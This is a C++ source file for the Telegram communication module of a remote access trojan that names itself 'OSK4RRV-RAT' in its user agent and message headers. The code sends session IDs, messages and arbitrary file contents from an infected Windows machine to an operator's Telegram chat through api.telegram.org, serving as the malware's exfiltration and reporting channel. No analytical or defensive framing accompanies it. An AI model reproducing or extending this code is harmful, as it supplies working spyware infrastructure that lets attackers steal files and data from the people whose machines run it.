#include "rat.h"
#include <sstream>

TelegramBot::TelegramBot() {}

TelegramBot::~TelegramBot() {
    if (worker.joinable())
        worker.join();
}

void TelegramBot::setConfig(const std::string& token, const std::string& chatId) {
    config.botToken = token;
    config.chatId = chatId;
}

void TelegramBot::setSessionId(const std::string& id) {
    sessionId = id;
}

std::wstring TelegramBot::stringToWString(const std::string& s) {
    if (s.empty()) return std::wstring();
    int len = MultiByteToWideChar(CP_UTF8, 0, s.c_str(), (int)s.size(), nullptr, 0);
    std::wstring wstr(len, 0);
    MultiByteToWideChar(CP_UTF8, 0, s.c_str(), (int)s.size(), &wstr[0], len);
    return wstr;
}

std::string TelegramBot::urlEncode(const std::string& s) {
    static const char hex[] = "0123456789ABCDEF";
    std::string result;
    for (char c : s) {
        if (isalnum((unsigned char)c) || c == '-' || c == '_' || c == '.' || c == '~') {
            result += c;
        } else {
            result += '%';
            result += hex[(unsigned char)c >> 4];
            result += hex[(unsigned char)c & 0xF];
        }
    }
    return result;
}

bool TelegramBot::httpRequest(const std::string& path, const std::string& body, std::string& response) {
    HINTERNET hSession = WinHttpOpen(L"OSK4RRV-RAT/1.0",
        WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
    if (!hSession) return false;

    HINTERNET hConnect = WinHttpConnect(hSession, L"api.telegram.org", INTERNET_DEFAULT_HTTPS_PORT, 0);
    if (!hConnect) { WinHttpCloseHandle(hSession); return false; }

    std::wstring wpath = stringToWString(path);
    HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"POST", wpath.c_str(),
        nullptr, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, WINHTTP_FLAG_SECURE);
    if (!hRequest) { WinHttpCloseHandle(hConnect); WinHttpCloseHandle(hSession); return false; }

    std::wstring headers = L"Content-Type: application/x-www-form-urlencoded\r\n";

    BOOL bResults = WinHttpSendRequest(hRequest, headers.c_str(), (DWORD)headers.size(),
        (LPVOID)body.c_str(), (DWORD)body.size(), (DWORD)body.size(), 0);

    if (bResults)
        bResults = WinHttpReceiveResponse(hRequest, nullptr);

    bool ok = false;
    if (bResults) {
        DWORD dwSize = 0;
        do {
            DWORD dwDownloaded = 0;
            if (!WinHttpQueryDataAvailable(hRequest, &dwSize)) break;
            if (dwSize == 0) break;

            char* buffer = new char[dwSize + 1];
            if (WinHttpReadData(hRequest, buffer, dwSize, &dwDownloaded)) {
                buffer[dwDownloaded] = 0;
                response += buffer;
            }
            delete[] buffer;
        } while (dwSize > 0);
        ok = !response.empty();
    }

    DWORD statusCode = 0;
    DWORD statusCodeSize = sizeof(statusCode);
    if (WinHttpQueryHeaders(hRequest, WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER,
        WINHTTP_HEADER_NAME_BY_INDEX, &statusCode, &statusCodeSize, WINHTTP_NO_HEADER_INDEX)) {
        ok = (statusCode == 200);
    }

    WinHttpCloseHandle(hRequest);
    WinHttpCloseHandle(hConnect);
    WinHttpCloseHandle(hSession);
    return ok;
}

void TelegramBot::sendMessageSync(const std::string& message) {
    state.status = TelegramStatus::Connecting;

    std::string path = "/bot" + config.botToken + "/sendMessage";
    std::string formattedMessage = "[Osk4rrv-Rat V1.0]\n";
    if (!sessionId.empty())
        formattedMessage += "Session ID: " + sessionId + "\n";
    formattedMessage += "\n" + message;

    std::string body = "chat_id=" + urlEncode(config.chatId) + "&text=" + urlEncode(formattedMessage);

    std::string response;
    bool ok = httpRequest(path, body, response);

    {
        std::lock_guard<std::mutex> lock(state.mtx);
        state.lastResponse = response;
        if (ok) {
            state.status = TelegramStatus::Connected;
            state.lastError.clear();
        } else {
            state.status = TelegramStatus::Failed;
            state.lastError = response.empty() ? "HTTP request failed" : response;
        }
    }
}

void TelegramBot::sendMessageAsync(const std::string& message) {
    if (worker.joinable())
        worker.join();

    state.status = TelegramStatus::Connecting;

    worker = std::thread([this, message]() {
        this->sendMessageSync(message);
    });
}

void TelegramBot::sendRawMessageSync(const std::string& message) {
    state.status = TelegramStatus::Connecting;

    std::string path = "/bot" + config.botToken + "/sendMessage";
    std::string body = "chat_id=" + urlEncode(config.chatId) + "&text=" + urlEncode(message);

    std::string response;
    bool ok = httpRequest(path, body, response);

    {
        std::lock_guard<std::mutex> lock(state.mtx);
        state.lastResponse = response;
        if (ok) {
            state.status = TelegramStatus::Connected;
            state.lastError.clear();
        } else {
            state.status = TelegramStatus::Failed;
            state.lastError = response.empty() ? "HTTP request failed" : response;
        }
    }
}

void TelegramBot::sendRawMessageAsync(const std::string& message) {
    if (worker.joinable())
        worker.join();

    state.status = TelegramStatus::Connecting;

    worker = std::thread([this, message]() {
        this->sendRawMessageSync(message);
    });
}

bool TelegramBot::httpRequestMultipart(const std::string& path, const std::string& contentType, const std::string& body, std::string& response) {
    HINTERNET hSession = WinHttpOpen(L"OSK4RRV-RAT/1.0",
        WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
    if (!hSession) return false;

    HINTERNET hConnect = WinHttpConnect(hSession, L"api.telegram.org", INTERNET_DEFAULT_HTTPS_PORT, 0);
    if (!hConnect) { WinHttpCloseHandle(hSession); return false; }

    std::wstring wpath = stringToWString(path);
    HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"POST", wpath.c_str(),
        nullptr, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, WINHTTP_FLAG_SECURE);
    if (!hRequest) { WinHttpCloseHandle(hConnect); WinHttpCloseHandle(hSession); return false; }

    std::wstring headers = L"Content-Type: " + stringToWString(contentType) + L"\r\n";

    BOOL bResults = WinHttpSendRequest(hRequest, headers.c_str(), (DWORD)headers.size(),
        (LPVOID)body.c_str(), (DWORD)body.size(), (DWORD)body.size(), 0);

    if (bResults)
        bResults = WinHttpReceiveResponse(hRequest, nullptr);

    bool ok = false;
    if (bResults) {
        DWORD dwSize = 0;
        do {
            DWORD dwDownloaded = 0;
            if (!WinHttpQueryDataAvailable(hRequest, &dwSize)) break;
            if (dwSize == 0) break;

            char* buffer = new char[dwSize + 1];
            if (WinHttpReadData(hRequest, buffer, dwSize, &dwDownloaded)) {
                buffer[dwDownloaded] = 0;
                response += buffer;
            }
            delete[] buffer;
        } while (dwSize > 0);
        ok = !response.empty();
    }

    DWORD statusCode = 0;
    DWORD statusCodeSize = sizeof(statusCode);
    if (WinHttpQueryHeaders(hRequest, WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER,
        WINHTTP_HEADER_NAME_BY_INDEX, &statusCode, &statusCodeSize, WINHTTP_NO_HEADER_INDEX)) {
        ok = (statusCode == 200);
    }

    WinHttpCloseHandle(hRequest);
    WinHttpCloseHandle(hConnect);
    WinHttpCloseHandle(hSession);
    return ok;
}

void TelegramBot::sendDocumentSync(const std::string& caption, const std::string& fileName, const std::vector<char>& fileData) {
    state.status = TelegramStatus::Connecting;

    std::string path = "/bot" + config.botToken + "/sendDocument";

    std::string boundary = "----OSK4RRVBoundary" + std::to_string(GetTickCount());

    std::string body;

    body += "--" + boundary + "\r\n";
    body += "Content-Disposition: form-data; name=\"chat_id\"\r\n\r\n";
    body += config.chatId + "\r\n";

    body += "--" + boundary + "\r\n";
    body += "Content-Disposition: form-data; name=\"caption\"\r\n\r\n";
    body += caption + "\r\n";

    body += "--" + boundary + "\r\n";
    body += "Content-Disposition: form-data; name=\"document\"; filename=\"" + fileName + "\"\r\n";
    body += "Content-Type: application/octet-stream\r\n\r\n";
    body.append(fileData.begin(), fileData.end());
    body += "\r\n";

    body += "--" + boundary + "--\r\n";

    std::string contentType = "multipart/form-data; boundary=" + boundary;

    std::string response;
    bool ok = httpRequestMultipart(path, contentType, body, response);

    {
        std::lock_guard<std::mutex> lock(state.mtx);
        state.lastResponse = response;
        if (ok) {
            state.status = TelegramStatus::Connected;
            state.lastError.clear();
        } else {
            state.status = TelegramStatus::Failed;
            state.lastError = response.empty() ? "HTTP request failed" : response;
        }
    }
}

void TelegramBot::sendDocumentAsync(const std::string& caption, const std::string& fileName, const std::vector<char>& fileData) {
    if (worker.joinable())
        worker.join();

    state.status = TelegramStatus::Connecting;

    worker = std::thread([this, caption, fileName, fileData]() {
        this->sendDocumentSync(caption, fileName, fileData);
    });
}

TelegramStatus TelegramBot::getStatus() const {
    return state.status.load();
}

std::string TelegramBot::getLastError() {
    std::lock_guard<std::mutex> lock(state.mtx);
    return state.lastError;
}

std::string TelegramBot::getLastResponse() {
    std::lock_guard<std::mutex> lock(state.mtx);
    return state.lastResponse;
}

bool TelegramBot::testConnection() {
    sendMessageSync("Connected.\xe2\x9c\x85");
    return getStatus() == TelegramStatus::Connected;
}

bool TelegramBot::httpRequestGet(const std::string& path, std::string& response) {
    HINTERNET hSession = WinHttpOpen(L"OSK4RRV-RAT/1.0",
        WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
    if (!hSession) return false;

    HINTERNET hConnect = WinHttpConnect(hSession, L"api.telegram.org", INTERNET_DEFAULT_HTTPS_PORT, 0);
    if (!hConnect) { WinHttpCloseHandle(hSession); return false; }

    std::wstring wpath = stringToWString(path);
    HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"GET", wpath.c_str(),
        nullptr, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, WINHTTP_FLAG_SECURE);
    if (!hRequest) { WinHttpCloseHandle(hConnect); WinHttpCloseHandle(hSession); return false; }

    BOOL bResults = WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0,
        WINHTTP_NO_REQUEST_DATA, 0, 0, 0);

    if (bResults)
        bResults = WinHttpReceiveResponse(hRequest, nullptr);

    bool ok = false;
    if (bResults) {
        DWORD dwSize = 0;
        do {
            DWORD dwDownloaded = 0;
            if (!WinHttpQueryDataAvailable(hRequest, &dwSize)) break;
            if (dwSize == 0) break;

            char* buffer = new char[dwSize + 1];
            if (WinHttpReadData(hRequest, buffer, dwSize, &dwDownloaded)) {
                buffer[dwDownloaded] = 0;
                response += buffer;
            }
            delete[] buffer;
        } while (dwSize > 0);
        ok = !response.empty();
    }

    DWORD statusCode = 0;
    DWORD statusCodeSize = sizeof(statusCode);
    if (WinHttpQueryHeaders(hRequest, WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER,
        WINHTTP_HEADER_NAME_BY_INDEX, &statusCode, &statusCodeSize, WINHTTP_NO_HEADER_INDEX)) {
        ok = (statusCode == 200);
    }

    WinHttpCloseHandle(hRequest);
    WinHttpCloseHandle(hConnect);
    WinHttpCloseHandle(hSession);
    return ok;
}

bool TelegramBot::verifyConnection() {
    state.status = TelegramStatus::Connecting;

    std::string path = "/bot" + config.botToken + "/getMe";
    std::string response;
    bool ok = httpRequestGet(path, response);

    {
        std::lock_guard<std::mutex> lock(state.mtx);
        state.lastResponse = response;
        if (ok) {
            state.status = TelegramStatus::Connected;
            state.lastError.clear();
        } else {
            state.status = TelegramStatus::Failed;
            state.lastError = response.empty() ? "Invalid token or network error" : response;
        }
    }
    return ok;
}

void TelegramBot::verifyConnectionAsync() {
    if (worker.joinable())
        worker.join();

    state.status = TelegramStatus::Connecting;

    worker = std::thread([this]() {
        this->verifyConnection();
    });
}

void TelegramBot::reset() {
    if (worker.joinable())
        worker.join();
    config = TelegramConfig{};
    sessionId.clear();
    state.status.store(TelegramStatus::Idle);
    state.lastError.clear();
    state.lastResponse.clear();
}
